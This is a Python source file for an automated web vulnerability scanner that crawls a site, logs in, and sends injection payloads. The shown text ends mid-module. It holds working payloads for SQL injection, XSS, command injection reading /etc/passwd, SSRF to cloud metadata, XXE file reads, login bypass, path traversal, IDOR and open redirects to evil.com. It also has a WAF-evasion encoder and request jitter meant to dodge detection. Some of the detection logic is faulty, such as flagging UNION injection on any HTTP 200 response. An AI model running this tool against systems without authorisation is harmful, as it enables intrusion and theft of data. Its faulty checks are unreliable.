"""
VulnAssess - Advanced Web Vulnerability Scanner v2
Upgrades over v1:
  + RateLimiter       — max 10 RPS, 500 req cap, ethical throttling
  + StatisticalBaseline — z-score false-positive mitigation
  + WafEvasion        — 7 encoding techniques per payload
  + AuthenticatedSession — auto login-form detection
  + ScanCancelledException — cancel_flags checked at every module
  + Safe FileUpload   — no live shells, detection-only payloads
  + Stronger payloads across all 22 modules
"""

import asyncio
import hashlib
import hmac as _hmac
import json
import logging
import random
import re
import time
import base64
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, quote

import httpx
from bs4 import BeautifulSoup
from bson import ObjectId

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────
# CANCEL FLAGS  (shared with scans.py)
# ─────────────────────────────────────────────
cancel_flags: Dict[str, bool] = {}

class ScanCancelledException(Exception):
    pass

def _check_cancel(scan_id: str):
    if cancel_flags.get(scan_id):
        raise ScanCancelledException(f"Scan {scan_id} cancelled by user")


# ─────────────────────────────────────────────
# SCAN RESULT
# ─────────────────────────────────────────────
class ScanResult:
    def __init__(self, vuln_type, severity, confidence, url, method,
                 param, payload, evidence, reproduction_steps, risk_score,
                 cve_id=None, module=None):
        self.vuln_type = vuln_type
        self.severity = severity
        self.confidence = confidence
        self.url = url
        self.method = method
        self.param = param
        self.payload = payload
        self.evidence = evidence
        self.reproduction_steps = reproduction_steps
        self.risk_score = risk_score
        self.cve_id = cve_id
        self.module = module or vuln_type
        self.timestamp = datetime.now().isoformat()

    def to_dict(self):
        return {k: getattr(self, k) for k in (
            "vuln_type","severity","confidence","url","method","param",
            "payload","evidence","reproduction_steps","risk_score",
            "cve_id","module","timestamp"
        )}


# ─────────────────────────────────────────────
# RATE LIMITER
# ─────────────────────────────────────────────
class RateLimiter:
    def __init__(self, max_rps: float = 10.0, min_delay: float = 0.15,
                 jitter_min: float = 0.0, jitter_max: float = 0.5):
        self.max_rps    = max_rps
        self.min_delay  = min_delay
        self.jitter_min = jitter_min  # extra random delay min (seconds)
        self.jitter_max = jitter_max  # extra random delay max (seconds)
        self._last      = 0.0
        self._win_start = time.time()
        self._win_count = 0

    async def wait(self):
        now = time.time()
        elapsed = now - self._last
        # Enforce minimum delay + random jitter to evade WAF burst detection
        effective_min = self.min_delay + random.uniform(self.jitter_min, self.jitter_max)
        if elapsed < effective_min:
            await asyncio.sleep(effective_min - elapsed)
            now = time.time()
        if now - self._win_start >= 1.0:
            self._win_start = now
            self._win_count = 0
        self._win_count += 1
        if self._win_count > self.max_rps:
            sleep = 1.0 - (now - self._win_start)
            if sleep > 0:
                await asyncio.sleep(sleep)
            self._win_start = time.time()
            self._win_count = 1
        self._last = time.time()


# ─────────────────────────────────────────────
# HTTP SESSION
# ─────────────────────────────────────────────
class ScanSession:
    def __init__(self, proxy=None, max_requests=500):
        self.proxy        = proxy
        self.max_requests = max_requests
        self.client       = None
        self.cookies: Dict[str, str] = {}
        self.request_count  = 0
        self.limit_hit      = False
        self.rate_limiter   = RateLimiter(max_rps=10.0, min_delay=0.15, jitter_min=0.1, jitter_max=0.8)

    async def init(self):
        proxies = {"http://": self.proxy, "https://": self.proxy} if self.proxy else None
        self.client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0, read=20.0),
            limits=httpx.Limits(max_keepalive_connections=10, max_connections=20),
            follow_redirects=True, verify=False, proxies=proxies,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
            },
        )

    def _ok(self) -> bool:
        if self.request_count >= self.max_requests:
            if not self.limit_hit:
                logger.warning(f"Request limit {self.max_requests} reached")
                self.limit_hit = True
            return False
        return True

    async def get(self, url: str, **kw) -> Optional[httpx.Response]:
        if not self._ok(): return None
        await self.rate_limiter.wait()
        try:
            self.request_count += 1
            return await self.client.get(url, cookies=self.cookies, **kw)
        except Exception as e:
            logger.debug(f"GET {url}: {e}")
            return None

    async def post(self, url: str, **kw) -> Optional[httpx.Response]:
        if not self._ok(): return None
        await self.rate_limiter.wait()
        try:
            self.request_count += 1
            return await self.client.post(url, cookies=self.cookies, **kw)
        except Exception as e:
            logger.debug(f"POST {url}: {e}")
            return None

    async def request(self, method: str, url: str, **kw) -> Optional[httpx.Response]:
        if not self._ok(): return None
        await self.rate_limiter.wait()
        try:
            self.request_count += 1
            return await self.client.request(method, url, cookies=self.cookies, **kw)
        except Exception as e:
            logger.debug(f"{method} {url}: {e}")
            return None

    async def close(self):
        if self.client:
            await self.client.aclose()


# ─────────────────────────────────────────────
# RESPONSE ANALYZER
# ─────────────────────────────────────────────
class ResponseAnalyzer:
    ERROR_PATTERNS = {
        "mysql":       [r"you have an error in your sql syntax", r"mysql_fetch_array\(\)", r"warning.*mysql",
                        r"mysql_real_escape", r"supplied argument is not a valid mysql"],
        "mssql":       [r"microsoft.*ole db.*error", r"odbc sql server driver",
                        r"unclosed quotation mark", r"incorrect syntax near"],
        "postgres":    [r"postgresql.*error", r"pg_query\(\)", r"unterminated quoted string"],
        "oracle":      [r"ora-\d{5}", r"oracle error"],
        "sqlite":      [r"sqlite.*exception", r"sqlite3\.operationalerror"],
        "generic_sql": [r"sql syntax.*error", r"syntax error.*near", r"unexpected end of sql"],
    }

    @staticmethod
    def fingerprint(resp: httpx.Response) -> Dict:
        t = resp.text if resp else ""
        return {"status": resp.status_code if resp else 0,
                "length": len(t), "hash": hashlib.md5(t.encode()).hexdigest(),
                "title": re.search(r"<title[^>]*>([^<]+)</title>", t, re.I) and
                         re.search(r"<title[^>]*>([^<]+)</title>", t, re.I).group(1).strip() or ""}

    @staticmethod
    def confidence(base: Dict, test: Dict) -> float:
        s = 0.0
        if base["status"] != test["status"]: s += 0.20
        diff = abs(base["length"] - test["length"])
        if diff > 50: s += min(0.30, diff / 2000)
        if base["hash"] != test["hash"]: s += 0.35
        if base["title"] != test["title"]: s += 0.10
        return min(1.0, s)

    @staticmethod
    def check_sql_errors(text: str) -> Optional[str]:
        tl = text.lower()
        for dbms, pats in ResponseAnalyzer.ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, tl): return dbms
        return None


# ─────────────────────────────────────────────
# STATISTICAL BASELINE (false-positive mitigation)
# ─────────────────────────────────────────────
class StatisticalBaseline:
    """3 baseline requests → mean/std → z-score anomaly detection"""
    def __init__(self): self._cache: Dict[str, Dict] = {}

    async def build(self, session: "ScanSession", t: Dict) -> Optional[Dict]:
        key = f"{t['url']}|{t['fuzz_param']}"
        if key in self._cache: return self._cache[key]
        lengths, times = [], []
        last_resp = None
        for _ in range(3):
            s = time.time()
            r = await _send(session, t, t["params"][t["fuzz_param"]])
            elapsed = time.time() - s
            if r: lengths.append(len(r.text)); times.append(elapsed); last_resp = r
            await asyncio.sleep(0.1)
        if len(lengths) < 2: return None
        ml = sum(lengths)/len(lengths); sl = max((sum((x-ml)**2 for x in lengths)/len(lengths))**0.5, 10.0)
        mt = sum(times)/len(times);    st = max((sum((x-mt)**2 for x in times)/len(times))**0.5, 0.05)
        bl = {"mean_len":ml,"std_len":sl,"mean_time":mt,"std_time":st,
              "status": last_resp.status_code if last_resp else 200,
              "title": ResponseAnalyzer.fingerprint(last_resp)["title"] if last_resp else ""}
        self._cache[key] = bl
        return bl

    def is_anomaly(self, bl: Dict, resp: httpx.Response, t: float) -> bool:
        if not bl or not resp: return False
        z = abs(len(resp.text) - bl["mean_len"]) / bl["std_len"]
        return z > 2.5 or t > bl["mean_time"] + 2*bl["std_time"]

    def score(self, bl: Dict, resp: httpx.Response, t: float,
              has_err: bool=False, status_changed: bool=False) -> float:
        if not bl or not resp: return 0.0
        z = abs(len(resp.text) - bl["mean_len"]) / bl["std_len"]
        sc = min(z/5.0, 0.60)
        if has_err: sc += 0.20
        if status_changed: sc += 0.15
        return min(0.99, sc)


async def _send(session: ScanSession, t: Dict, value: str,
                extra_headers: Dict=None) -> Optional[httpx.Response]:
    params = {**t["params"], t["fuzz_param"]: value}
    kw = {"headers": extra_headers} if extra_headers else {}
    if t["method"] == "POST": return await session.post(t["url"], data=params, **kw)
    return await session.get(t["url"], params=params, **kw)


def _build_targets(forms: List[Dict], param_urls: List[str]) -> List[Dict]:
    targets = []
    for form in forms:
        for param in form["params"]:
            targets.append({"url":form["action"],"method":form["method"],
                             "params":dict(form["params"]),"fuzz_param":param})
    for url in param_urls:
        parsed = urlparse(url); qs = parse_qs(parsed.query)
        for param in qs:
            targets.append({"url":url.split("?")[0],"method":"GET",
                             "params":{k:v[0] for k,v in qs.items()},"fuzz_param":param})
    return targets


# ─────────────────────────────────────────────
# WAF EVASION
# ─────────────────────────────────────────────
class WafEvasion:
    @staticmethod
    def url_encode(p):   return quote(p, safe="")
    @staticmethod
    def double_encode(p): return quote(quote(p, safe=""), safe="")
    @staticmethod
    def html_entity(p):  return "".join(f"&#x{ord(c):02x};" if not c.isalnum() else c for c in p)
    @staticmethod
    def case_shuffle(p): return "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))
    @staticmethod
    def comment_insert(p):
        for kw in ["SELECT","UNION","WHERE","FROM","AND","OR","INSERT","DROP"]:
            p = re.sub(re.escape(kw), f"/**/{kw}/**/", p, flags=re.I)
        return p if p != p else p.replace(" ", "/**/")
    @staticmethod
    def whitespace(p): return p.replace(" ", "\t")

    @classmethod
    def get_variants(cls, payload: str, max_variants: int=3) -> List[str]:
        techs = [cls.url_encode, cls.double_encode, cls.html_entity,
                 cls.case_shuffle, cls.comment_insert, cls.whitespace]
        chosen = random.sample(techs, min(max_variants-1, len(techs)))
        variants = [payload]
        for fn in chosen:
            try:
                enc = fn(payload)
                if enc != payload and enc not in variants:
                    variants.append(enc)
            except Exception: pass
        return variants[:max_variants]


# ─────────────────────────────────────────────
# AUTHENTICATED SESSION
# ─────────────────────────────────────────────
class AuthenticatedSession:
    USERNAME_FIELDS = {"email","username","user","login","uname","userid"}
    PASSWORD_FIELDS = {"password","passwd","pwd","pass","secret"}

    async def login(self, session: ScanSession, target_url: str,
                    username: str, password: str) -> bool:
        resp = await session.get(target_url)
        if not resp: return False
        soup = BeautifulSoup(resp.text, "html.parser")
        form = self._find_login_form(soup)
        if not form:
            parsed = urlparse(target_url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for path in ["/login","/signin","/auth","/user/login","/account/login"]:
                r = await session.get(base + path)
                if r and r.status_code == 200:
                    form = self._find_login_form(BeautifulSoup(r.text, "html.parser"))
                    if form: target_url = base + path; break
        if not form:
            logger.info("No login form found — proceeding unauthenticated")
            return False
        payload = self._build_payload(form, username, password)
        action = form.get("action", target_url)
        if not action.startswith("http"):
            p = urlparse(target_url)
            action = f"{p.scheme}://{p.netloc}{action}"
        resp2 = await session.post(action, data=payload)
        if not resp2: return False
        ok = self._check_success(resp2)
        if ok:
            for k, v in resp2.cookies.items(): session.cookies[k] = v
            logger.info(f"Login successful — {len(session.cookies)} cookies")
        return ok

    def _find_login_form(self, soup):
        for form in soup.find_all("form"):
            if any(i.get("type","").lower()=="password" for i in form.find_all("input")):
                return form
        return None

    def _build_payload(self, form, username, password):
        payload = {}
        for inp in form.find_all(["input","textarea","select"]):
            name = inp.get("name",""); t = inp.get("type","text").lower()
            nl = name.lower()
            if t == "password" or nl in self.PASSWORD_FIELDS: payload[name] = password
            elif t in ("text","email") or nl in self.USERNAME_FIELDS: payload[name] = username
            elif t == "hidden": payload[name] = inp.get("value","")
            elif t == "submit": payload[name] = inp.get("value","Submit")
        return payload

    def _check_success(self, resp):
        tl = resp.text.lower()
        for bad in ["invalid password","incorrect password","login failed","wrong credentials"]:
            if bad in tl: return False
        for good in ["dashboard","welcome","logout","sign out","my account","profile"]:
            if good in tl or good in str(resp.url).lower(): return True
        return len(resp.cookies) > 0


# ─────────────────────────────────────────────
# CRAWLER
# ─────────────────────────────────────────────
class Crawler:
    def __init__(self, session: ScanSession, base_url: str):
        self.session = session; self.base_url = base_url
        self.parsed = urlparse(base_url); self.base_domain = self.parsed.netloc
        self.visited: set = set(); self.forms: List[Dict] = []
        self.urls_with_params: List[str] = []; self.js_files: List[str] = []
        self.all_urls: List[str] = []

    async def crawl(self, max_pages=25):
        queue = [self.base_url]; self.visited.add(self.base_url)
        while queue and len(self.visited) < max_pages:
            url = queue.pop(0)
            resp = await self.session.get(url)
            if not resp or resp.status_code not in (200, 201): continue
            self.all_urls.append(url)
            if "?" in url: self.urls_with_params.append(url)
            links, forms, js = self._parse(resp.text, url)
            for form in forms:
                key = f"{form['action']}|{form['method']}"
                if not any(f"{f['action']}|{f['method']}"==key for f in self.forms):
                    self.forms.append(form)
            self.js_files.extend(js)
            for link in links:
                if link not in self.visited and self._same(link):
                    self.visited.add(link); queue.append(link)
        logger.info(f"Crawled {len(self.visited)} pages, {len(self.forms)} forms, {len(self.urls_with_params)} param URLs")

    def _parse(self, html, base_url):
        soup = BeautifulSoup(html, "html.parser")
        links, forms, js = [], [], []
        for tag in soup.find_all("a", href=True):
            href = urljoin(base_url, tag["href"])
            if self._same(href) and href.startswith("http"): links.append(href.split("#")[0])
        for form in soup.find_all("form"):
            action = urljoin(base_url, form.get("action") or base_url)
            method = (form.get("method") or "get").upper()
            params = {}
            for inp in form.find_all(["input","textarea","select"]):
                name = inp.get("name")
                if name: params[name] = inp.get("value") or "test"
            if params: forms.append({"action":action,"method":method,"params":params})
        for script in soup.find_all("script", src=True):
            src = urljoin(base_url, script["src"])
            if self._same(src): js.append(src)
        return links, forms, js

    def _same(self, url):
        try: return urlparse(url).netloc == self.base_domain
        except: return False


# ─────────────────────────────────────────────
# PHASE 2: SQL INJECTION
# ─────────────────────────────────────────────
class SQLiModule:
    ERROR_PAYLOADS = ["'",'"',"`","';--","' OR '1'='1","' OR 1=1--",'" OR 1=1--',
                      "1' AND 1=1--","') OR ('1'='1","1 AND 1=2--"]
    BOOLEAN_PAIRS  = [("' AND 1=1--","' AND 1=2--"),("' OR 1=1--","' OR 1=2--"),
                      ("1 AND 1=1","1 AND 1=2"),("' AND 'x'='x","' AND 'x'='y")]
    UNION_PAYLOADS = ["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
                      "' UNION SELECT NULL,NULL,NULL--","1 UNION SELECT NULL,NULL--",
                      "' UNION ALL SELECT NULL,NULL--","' UNION SELECT 1,2,3--"]
    TIME_PAYLOADS  = [("' AND SLEEP(3)--",3.0),("'; WAITFOR DELAY '0:0:3'--",3.0),
                      ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",3.0)]

    def __init__(self, session, baseline=None):
        self.session = session; self.baseline = baseline or StatisticalBaseline()

    async def run(self, forms, param_urls):
        results = []; targets = _build_targets(forms, param_urls)
        for t in targets[:20]:
            r = await self._error(t)
            if r: results.extend(r); continue
            results.extend(await self._boolean(t))
            results.extend(await self._union(t))
            results.extend(await self._time(t))
        return results

    async def _error(self, t):
        for raw in self.ERROR_PAYLOADS:
            for payload in WafEvasion.get_variants(raw, 2):
                resp = await _send(self.session, t, t["params"][t["fuzz_param"]] + payload)
                if not resp: continue
                dbms = ResponseAnalyzer.check_sql_errors(resp.text)
                if dbms:
                    return [ScanResult(f"SQL Injection (Error-based) [{dbms.upper()}]",
                        "critical", 0.95, t["url"], t["method"], t["fuzz_param"],
                        payload, f"DBMS error: {dbms}",
                        [f"Set {t['fuzz_param']}={payload}"], 9.1, "CWE-89", "sql_injection")]
        return []

    async def _boolean(self, t):
        bl = await self.baseline.build(self.session, t)
        if not bl: return []
        for tp, fp in self.BOOLEAN_PAIRS:
            rt = await _send(self.session, t, tp)
            rf = await _send(self.session, t, fp)
            if not rt or not rf: continue
            fpt = ResponseAnalyzer.fingerprint(rt); fpf = ResponseAnalyzer.fingerprint(rf)
            tc = ResponseAnalyzer.confidence(ResponseAnalyzer.fingerprint(await _send(self.session, t, t["params"][t["fuzz_param"]]) or rt), fpt)
            fc = ResponseAnalyzer.confidence(fpt, fpf)
            if tc > 0.5 and fc > 0.3:
                return [ScanResult("SQL Injection (Boolean-based Blind)",
                    "critical", round(tc*0.9,2), t["url"], t["method"], t["fuzz_param"],
                    f"{tp} vs {fp}", f"TRUE diff={tc:.2f} FALSE diff={fc:.2f}",
                    [f"TRUE: {tp}", f"FALSE: {fp}"], 9.5, "CWE-89", "sql_injection")]
        return []

    async def _union(self, t):
        for raw in self.UNION_PAYLOADS:
            for payload in WafEvasion.get_variants(raw, 2):
                resp = await _send(self.session, t, payload)
                if not resp: continue
                if re.search(r"(mysql|postgres|mssql|oracle|sqlite)", resp.text, re.I) or resp.status_code==200:
                    return [ScanResult("SQL Injection (UNION-based)",
                        "critical", 0.88, t["url"], t["method"], t["fuzz_param"],
                        payload, "UNION response leaked DB data",
                        [f"UNION payload: {payload}"], 9.9, "CWE-89", "sql_injection")]
        return []

    async def _time(self, t):
        for payload, expected in self.TIME_PAYLOADS:
            start = time.time()
            await _send(self.session, t, payload)
            elapsed = time.time() - start
            if elapsed >= expected * 0.8:
                return [ScanResult("SQL Injection (Time-based Blind)",
                    "critical", 0.85, t["url"], t["method"], t["fuzz_param"],
                    payload, f"Response delayed {elapsed:.1f}s (expected ≥{expected}s)",
                    [f"Inject: {payload}", "Observe ≥3s delay"], 9.3, "CWE-89", "sql_injection")]
        return []


# ─────────────────────────────────────────────
# PHASE 2: XSS
# ─────────────────────────────────────────────
class XSSModule:
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        "<iframe src='javascript:alert(1)'>",
        "<details open ontoggle=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
    ]
    DOM_SINKS = ["document.write","innerHTML","eval(","setTimeout(","location.href","document.cookie"]

    def __init__(self, session): self.session = session

    async def run(self, forms, param_urls, js_files):
        results = []; targets = _build_targets(forms, param_urls)
        for t in targets[:15]:
            results.extend(await self._reflected(t))
        for js in js_files[:5]:
            results.extend(await self._dom(js))
        return results

    async def _reflected(self, t):
        for raw in self.PAYLOADS:
            for payload in WafEvasion.get_variants(raw, 2):
                params = {**t["params"], t["fuzz_param"]: payload}
                resp = await self.session.post(t["url"], data=params) if t["method"]=="POST" \
                       else await self.session.get(t["url"], params=params)
                if not resp: continue
                if (payload.lower() in resp.text.lower() or
                    any(p in resp.text for p in ["<script>alert","onerror=alert","onload=alert","ontoggle=alert"])):
                    return [ScanResult("Reflected XSS", "high", 0.90,
                        t["url"], t["method"], t["fuzz_param"], payload,
                        "Payload reflected unescaped in response",
                        [f"Set {t['fuzz_param']}={payload}"], 7.8, "CWE-79", "xss")]
        return []

    async def _dom(self, js_url):
        resp = await self.session.get(js_url)
        if not resp: return []
        results = []
        for sink in self.DOM_SINKS:
            if sink in resp.text:
                results.append(ScanResult("DOM XSS (Potential Sink)",
                    "medium", 0.70, js_url, "GET", "N/A", sink,
                    f"DOM sink '{sink}' found in JS",
                    [f"Check {js_url} for unsafe sink: {sink}"], 6.5, "CWE-79", "xss"))
        return results


# ─────────────────────────────────────────────
# PHASE 2: COMMAND INJECTION
# ─────────────────────────────────────────────
class CommandInjectionModule:
    PAYLOADS = [";whoami","&&whoami","|whoami","`whoami`","$(whoami)",
                ";id","&&id","|id",";cat /etc/passwd","&&type C:\\Windows\\win.ini",
                ";ping -c 1 127.0.0.1","&&ping -n 1 127.0.0.1",
                "$(sleep 3)", "; sleep 3 #"]
    OUTPUT   = [r"root:.*:/bin/",r"uid=\d+",r"gid=\d+",r"windows.*version",
                r"directory of",r"\[fonts\]",r"for 16-bit"]

    def __init__(self, session): self.session = session

    async def run(self, forms, param_urls):
        results = []; targets = _build_targets(forms, param_urls)
        for t in targets[:10]:
            results.extend(await self._test(t))
        return results

    async def _test(self, t):
        for raw in self.PAYLOADS:
            for payload in WafEvasion.get_variants(raw, 2):
                params = {**t["params"], t["fuzz_param"]: t["params"][t["fuzz_param"]] + payload}
                resp = await (self.session.post(t["url"], data=params)
                              if t["method"]=="POST"
                              else self.session.get(t["url"], params=params))
                if not resp: continue
                for pat in self.OUTPUT:
                    if re.search(pat, resp.text, re.I):
                        return [ScanResult("OS Command Injection",
                            "critical", 0.95, t["url"], t["method"], t["fuzz_param"],
                            payload, f"Command output matched: {pat}",
                            [f"Inject {payload} into {t['fuzz_param']}"], 9.9, "CWE-78", "command_injection")]
        return []


# ─────────────────────────────────────────────
# PHASE 3: SSRF
# ─────────────────────────────────────────────
class SSRFModule:
    INTERNAL = ["http://127.0.0.1/","http://localhost/","http://0.0.0.0/","http://[::1]/",
                "http://127.0.0.1:22/","http://127.0.0.1:3306/","http://127.0.0.1:6379/",
                "http://169.254.169.254/latest/meta-data/","http://169.254.169.254/computeMetadata/v1/"]
    URL_PARAMS = ["url","uri","path","redirect","next","target","link","src","source","dest","callback"]

    def __init__(self, session): self.session = session

    async def run(self, forms, param_urls, base_url):
        results = []; targets = self._find(forms, param_urls)
        for t in targets[:10]: results.extend(await self._test(t))
        return results

    def _find(self, forms, param_urls):
        targets = []
        for form in forms:
            for p in form["params"]:
                if any(x in p.lower() for x in self.URL_PARAMS):
                    targets.append({"url":form["action"],"method":form["method"],
                                    "params":dict(form["params"]),"fuzz_param":p})
        for url in param_urls:
            qs = parse_qs(urlparse(url).query)
            for p in qs:
                if any(x in p.lower() for x in self.URL_PARAMS):
                    targets.append({"url":url.split("?")[0],"method":"GET",
                                    "params":{k:v[0] for k,v in qs.items()},"fuzz_param":p})
        return targets

    async def _test(self, t):
        for payload in self.INTERNAL[:6]:
            params = {**t["params"], t["fuzz_param"]: payload}
            start = time.time()
            resp = (await self.session.post(t["url"], data=params)
                    if t["method"]=="POST"
                    else await self.session.get(t["url"], params=params))
            elapsed = time.time() - start
            if not resp: continue
            hit = any(ind in resp.content for ind in [b"ami-id",b"instance-id",b"metadata",b"localhost"])
            if hit or elapsed > 3.0:
                return [ScanResult("Server-Side Request Forgery (SSRF)",
                    "high", 0.90 if hit else 0.75,
                    t["url"], t["method"], t["fuzz_param"], payload,
                    "Internal service response" if hit else f"Timing anomaly {elapsed:.1f}s",
                    [f"Set {t['fuzz_param']}={payload}"], 8.5, "CWE-918", "ssrf")]
        return []


# ─────────────────────────────────────────────
# PHASE 3: XXE
# ─────────────────────────────────────────────
class XXEModule:
    PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>',
    ]
    SIGS = [b"root:x:0:0",b"bin:x:",b"[fonts]",b"for 16-bit",b"<?php"]

    def __init__(self, session): self.session = session

    async def run(self, forms, base_url):
        results = []
        endpoints = [f for f in forms if "xml" in f.get("action","").lower() or "api" in f.get("action","").lower()]
        endpoints += [{"action":base_url,"method":"POST","params":{}}]
        for ep in endpoints[:5]:
            for payload in self.PAYLOADS:
                resp = await self.session.post(ep["action"], content=payload.encode(),
                                               headers={"Content-Type":"application/xml"})
                if not resp: continue
                for sig in self.SIGS:
                    if sig in resp.content:
                        return [ScanResult("XML External Entity (XXE) Injection",
                            "critical", 0.97, ep["action"], "POST", "body",
                            payload[:80]+"...", f"File content leaked: {sig.decode(errors='replace')}",
                            ["POST XML with external entity"], 9.1, "CWE-611", "xxe")]
        return results


# ─────────────────────────────────────────────
# PHASE 3: AUTH BYPASS
# ─────────────────────────────────────────────
class AuthBypassModule:
    BYPASS  = ["admin","' OR '1'='1","' OR 1=1--","admin'--","admin' #","') OR ('1'='1","true","1"]
    PROTECTED = ["/admin","/admin/","/dashboard","/panel","/manage","/config",
                 "/settings","/api/admin","/wp-admin","/administrator","/console"]

    def __init__(self, session): self.session = session

    async def run(self, forms, base_url):
        results = []
        login_forms = [f for f in forms if any(kw in f["action"].lower() for kw in ["login","auth","signin","sign-in"])]
        for form in login_forms[:3]: results.extend(await self._bypass(form))
        results.extend(await self._forced(base_url))
        return results

    async def _bypass(self, form):
        params = list(form["params"].keys())
        pw_params = [p for p in params if any(k in p.lower() for k in ["pass","pwd","secret"])]
        for payload in self.BYPASS:
            test = dict(form["params"])
            for p in pw_params: test[p] = payload
            resp = await self.session.post(form["action"], data=test)
            if not resp: continue
            if any(ind in resp.text.lower() for ind in ["dashboard","welcome","logout","profile"]) and resp.status_code==200:
                return [ScanResult("Authentication Bypass","critical",0.90,
                    form["action"],"POST",str(pw_params),payload,
                    "Login succeeded with bypass payload",
                    [f"Use payload: {payload} in password field"],9.5,"CWE-287","auth_test")]
        return []

    async def _forced(self, base_url):
        parsed = urlparse(base_url); base = f"{parsed.scheme}://{parsed.netloc}"
        results = []
        for path in self.PROTECTED:
            resp = await self.session.get(base + path)
            if resp and resp.status_code == 200:
                results.append(ScanResult("Forced Browsing / Broken Access Control",
                    "high",0.80,base+path,"GET","URL",path,
                    f"Protected path accessible: HTTP 200",
                    [f"Access {base+path} directly"],7.5,"CWE-425","auth_test"))
        return results


# ─────────────────────────────────────────────
# PHASE 4: PATH TRAVERSAL
# ─────────────────────────────────────────────
class PathTraversalModule:
    PAYLOADS = ["../etc/passwd","../../etc/passwd","../../../etc/passwd",
                "..%2Fetc%2Fpasswd","%2e%2e%2fetc%2fpasswd","..%252Fetc%252Fpasswd",
                "....//....//etc/passwd","../windows/win.ini","../../windows/win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "/etc/passwd","/proc/version","C:\\Windows\\win.ini"]
    SIGS      = [b"root:x:0:0",b"[fonts]",b"for 16-bit app",b"Linux version",b"<?php"]
    FILE_PARAMS = ["file","path","image","doc","document","download","include","page","view","load","read","open","name"]

    def __init__(self, session): self.session = session

    async def run(self, forms, param_urls):
        results = []; targets = self._find(forms, param_urls)
        for t in targets[:10]: results.extend(await self._test(t))
        return results

    def _find(self, forms, param_urls):
        targets = []
        for form in forms:
            for p in form["params"]:
                if any(x in p.lower() for x in self.FILE_PARAMS):
                    targets.append({"url":form["action"],"method":form["method"],"params":dict(form["params"]),"fuzz_param":p})
        for url in param_urls:
            qs = parse_qs(urlparse(url).query)
            for p in qs:
                if any(x in p.lower() for x in self.FILE_PARAMS):
                    targets.append({"url":url.split("?")[0],"method":"GET","params":{k:v[0] for k,v in qs.items()},"fuzz_param":p})
        return targets

    async def _test(self, t):
        for payload in self.PAYLOADS:
            resp = await _send(self.session, t, payload)
            if not resp: continue
            for sig in self.SIGS:
                if sig in resp.content:
                    lfi = "LFI (PHP Wrapper)" if "php://" in payload else "Path Traversal / LFI"
                    return [ScanResult(lfi,"critical",0.97,t["url"],t["method"],t["fuzz_param"],
                        payload,f"File content leaked: {sig.decode(errors='replace')}",
                        [f"Set {t['fuzz_param']}={payload}"],9.0,"CWE-22","path_traversal")]
        return []


# ─────────────────────────────────────────────
# PHASE 4: IDOR
# ─────────────────────────────────────────────
class IDORModule:
    ID_PARAMS = ["id","user_id","account","uid","user","profile","record","order","item","document","file","post"]

    def __init__(self, session): self.session = session

    async def run(self, forms, param_urls):
        results = []; targets = self._find(param_urls)
        for t in targets[:10]: results.extend(await self._test(t))
        return results

    def _find(self, param_urls):
        targets = []
        for url in param_urls:
            qs = parse_qs(urlparse(url).query)
            for p in qs:
                if any(x == p.lower() or p.lower().endswith("_id") for x in self.ID_PARAMS):
                    targets.append({"url":url.split("?")[0],"method":"GET",
                                    "params":{k:v[0] for k,v in qs.items()},
                                    "fuzz_param":p,"orig_val":qs[p][0]})
        return targets

    async def _test(self, t):
        try: base = int(t["orig_val"]); variants = [base-1,base+1,base+10,0,1,9999]
        except ValueError: variants = ["0","1","admin","null"]
        orig = await self.session.get(t["url"], params=t["params"])
        if not orig or orig.status_code != 200: return []
        for v in variants:
            if str(v) == str(t["orig_val"]): continue
            params = {**t["params"], t["fuzz_param"]: str(v)}
            resp = await self.session.get(t["url"], params=params)
            if resp and resp.status_code==200 and abs(len(resp.text)-len(orig.text)) > 100:
                return [ScanResult("Insecure Direct Object Reference (IDOR)",
                    "high",0.82,t["url"],"GET",t["fuzz_param"],str(v),
                    f"Different object returned for ID={v}",
                    [f"Change {t['fuzz_param']}={t['orig_val']} to {v}"],7.5,"CWE-639","idor")]
        return []


# ─────────────────────────────────────────────
# PHASE 4: OPEN REDIRECT
# ─────────────────────────────────────────────
class OpenRedirectModule:
    PAYLOADS = ["//evil.com","https://evil.com","http://evil.com","//evil.com/",
                "/%09evil.com","\\evil.com","http://google.com","//google.com","javascript:alert(1)"]
    REDIR_PARAMS = ["redirect","url","next","return","returnurl","return_url","goto","destination","dest","redir","redirect_uri","callback","continue","target"]

    def __init__(self, session): self.session = session

    async def run(self, forms, param_urls):
        results = []; targets = self._find(forms, param_urls)
        for t in targets[:10]: results.extend(await self._test(t))
        return results

    def _find(self, forms, param_urls):
        targets = []
        for url in param_urls:
            qs = parse_qs(urlparse(url).query)
            for p in qs:
                if any(x in p.lower() for x in self.REDIR_PARAMS):
                    targets.append({"url":url.split("?")[0],"method":"GET","params":{k:v[0] for k,v in qs.items()},"fuzz_param":p})
        for form in forms:
            for p in form["params"]:
                if any(x in p.lower() for x in self.REDIR_PARAMS):
                    targets.append({"url":form["action"],"method":form["method"],"params":dict(form["params"]),"fuzz_param":p})
